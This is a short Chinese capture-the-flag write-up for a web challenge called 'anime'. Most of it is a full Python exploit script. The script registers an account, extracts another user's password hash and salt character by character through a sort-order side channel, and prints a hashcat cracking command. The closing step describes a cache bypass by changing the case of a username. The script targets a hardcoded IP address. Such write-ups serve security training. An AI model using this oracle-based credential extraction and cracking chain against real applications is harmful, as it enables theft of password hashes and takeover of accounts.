---
tags: [源码审计, 信息泄露, 侧信道攻击, 布尔盲注, 密码爆破, 缓存绕过]
---

# anime

搜索/scripts/switchTheme.js"></script>在github上可以发现源码：

然后发现wp ，测试后发现与题目后端基本一致 ，修改其中脚本如下

```
代码块
1
2   import requests
3   import re 4
5  def create_session(base_url):
6       return requests.Session(), base_url
7
8  def get_random_user():
9       random_user = requests.get("https://api.jikan.moe/v4/random/users").json()
10      return {
11           "username": random_user["data"]["username"],
12           "password": "12345678"
13      }
14
15  def login(session, base_url, username, password):
16       login_url = f"{base_url}/register"
17       payload = {
18           "username": username,
19           "password": password
20       }
21       print(session.post(login_url, data=payload).text) 22
23  def get_secret(session, base_url, username):
24       res = session.get(f"{base_url}/user/{username}/edit")
25       secret_match = re.search(r'name="secret"\s+value="([^"]+)"', res.text)
26       return secret_match.group(1) if secret_match else None 27
28  def update_field(session, base_url, username, secret, field, value):
29       return session.post(f"{base_url}/user/{username}/edit", data={
30           "secret": secret,
31           field: value
32       }).content
33
34  def get_user_positions(session:requests.Session, base_url, field,
target_username):
35       res = session.get(f"{base_url}/users", params={"sort": field+" -
created_at","limit":1000}).content
36      users = re.findall(r'href="/user/([^/]+)/profile"[^>]*>([^<]+)</a>',
res.decode())
37       print(users)
38
39       current_user_index = next((i for i, (username, display) in enumerate(users)
if username == target_username and display == target_username), -1)
40       print(current_user_index)
41       TTXSMcc_index = next((i for i, (username, _) in enumerate(users) if
username == 'TTXSMcc'), -1)
42
43       return current_user_index, TTXSMcc_index 44
45  def compare_positions(username, current_index, TTXSMcc_index):
46       print(f"Current user ({username}) position: {current_index}")
47       print(f"TTXSMcc position: {TTXSMcc_index}") 48
49       if current_index != -1 and TTXSMcc_index != -1:
50          if current_index < TTXSMcc_index:
51               print(f"{username} appears before TTXSMcc")
52          elif current_index > TTXSMcc_index:
53               print(f"{username} appears after TTXSMcc")
54          else:
55               print(f"{username} and TTXSMcc are at the same position") 56
57  def main():
58       # session, base_url = create_session("http://localhost:8888")
59      session, base_url = create_session("http://47.105.120.74:1001") 60
61       random_user = get_random_user()
62       print(random_user)
63       login(session, base_url, random_user["username"], random_user["password"]) 64
65       secret = get_secret(session, base_url, random_user["username"])
66       print(f"Secret1: {secret}")
67
68       hash_value = ""
69       for i in range(64):
70           for j in range(15, -1, -1):
71               potential_hash = hash_value + hex(j)[2:]
72               result = update_field(session, base_url, random_user["username"], secret, "hash", potential_hash)
73
74               current_index, TTXSMcc_index = get_user_positions(session, base_url, "hash", random_user["username"])
75               print(current_index)
76               print(TTXSMcc_index)
77               if current_index < TTXSMcc_index:
78                   hash_value = potential_hash
79                   print(f"Updated hash: {hash_value}")
80                  break 81
82      salt = ""
83       for i in range(32):
84           for j in range(15, -1, -1):
85               potential_salt = salt + hex(j)[2:]
86               result = update_field(session, base_url, random_user["username"], secret, "salt", potential_salt)
87
88               current_index, TTXSMcc_index = get_user_positions(session, base_url, "salt", random_user["username"])
89               if current_index < TTXSMcc_index:
90                   salt = potential_salt
91                   print(f"Updated salt: {salt}")
92                  break
93       print("Final hash and salt values:")
94       print(f"Hash: {hash_value}")
95       print(f"Salt: {salt}")
96       import base64 97
98       iterations = 25000
99
100      salt_b64 = base64.b64encode(salt.encode('utf-8')).decode()
101       hash_b64 = base64.b64encode(bytes.fromhex(hash_value)).decode()
102       print(f"hashcat -m 10900 -a 3 sha256:{iterations}:{salt_b64}:{hash_b64} -- show")
103   if __name__ == "__main__":
104       main()
105
106
```

爆破出来后登陆 ，个人资料修改用户名一位大写为小写绕过缓存即可。

 